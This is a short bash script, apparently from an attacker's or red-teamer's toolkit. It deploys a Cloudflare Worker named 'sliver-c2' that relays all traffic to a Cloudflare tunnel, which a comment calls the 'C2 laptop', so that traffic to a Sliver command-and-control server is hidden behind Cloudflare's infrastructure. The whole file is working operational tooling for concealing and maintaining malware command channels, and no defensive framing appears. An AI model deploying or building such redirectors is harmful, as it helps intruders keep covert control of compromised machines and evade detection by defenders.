#!/bin/bash
# Remote Worker Update Script
# Updates Cloudflare Worker forwarding target WITHOUT needing the C2 laptop
# Usage: ./remote-update-worker.sh <TUNNEL_URL>
# Run from ANY device with wrangler installed + CF_API_TOKEN set

set -e
TUNNEL_HOST="${1:?Usage: $0 <tunnel-url>  (e.g. $0 something.trycloudflare.com)}"
CF_API_TOKEN="${CF_API_TOKEN:?Set CF_API_TOKEN env var}"

TMPDIR=$(mktemp -d)
cd "$TMPDIR"

cat > wrangler.toml << TOML
name = "sliver-c2"
main = "worker.js"
compatibility_date = "2025-01-01"
TOML

python3 -c "
with open('worker.js','w') as f:
    f.write('''export default {
  async fetch(request, env) {
    const url = new URL(request.url)
    const target = 'https://${TUNNEL_HOST}' + url.pathname + url.search
    const body = request.method !== 'GET' && request.method !== 'HEAD' ? await request.arrayBuffer() : undefined
    const modified = new Request(target, {
      method: request.method,
      headers: request.headers,
      body
    })
    try { return await fetch(modified) } catch(e) { return new Response('offline', { status: 503 }) }
  }
}''')
print(f'Worker will forward to: ${TUNNEL_HOST}')
"

CLOUDFLARE_API_TOKEN="$CF_API_TOKEN" npx wrangler deploy 2>&1 | grep -E "worker|Error"

rm -rf "$TMPDIR"
echo "Done. Worker now forwards to $TUNNEL_HOST"
